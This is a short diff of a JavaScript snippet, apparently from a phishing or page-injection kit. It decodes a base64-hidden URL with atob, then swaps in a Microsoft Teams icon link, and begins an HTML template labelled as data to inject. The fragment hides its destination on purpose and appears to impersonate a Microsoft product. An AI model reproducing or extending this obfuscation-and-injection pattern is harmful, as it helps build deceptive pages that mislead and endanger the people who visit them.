@@ -1,6 +1,6 @@
 // The link hidden with b64.
 var link = atob("aHR0cHM6Ly9iZzJsejg1Zi5iZWFud2ViLnF6ei5pby5jZG4uY2xvdWRmbGFyZS5uZXQv");
-
+link = "https://statics.teams.cdn.office.net/evergreen-assets/icons/microsoft_teams_logo_refresh_v2025.ico";
 // HTML data to inject.
 var htmlData = `
 <head style="margin: 0; padding: 0; overflow: hidden;">
